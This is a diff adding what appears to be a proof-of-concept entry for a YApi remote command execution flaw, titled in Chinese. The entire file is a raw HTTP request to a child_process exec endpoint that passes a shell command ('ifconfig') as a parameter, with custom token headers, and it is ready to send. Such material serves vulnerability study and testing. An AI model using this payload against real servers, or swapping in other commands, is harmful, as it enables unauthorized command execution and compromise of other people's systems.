@@ -1,0 +1,9 @@
+# Yapi远程代码执行漏洞
+# yapi 存在远程命令执行漏洞
+GET /tool/child_process/exec?acid=80002176&strip_slashes=system&host=ifconfig&bid=hd_tag_m8mv25j8 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25j8
+RM-PRO-Token: 3f72a2de3f22fc30ceed84e3ec67854d
+RM-PRO-Time: 1742808472295
+User-Agent: curl/7.83.1
+
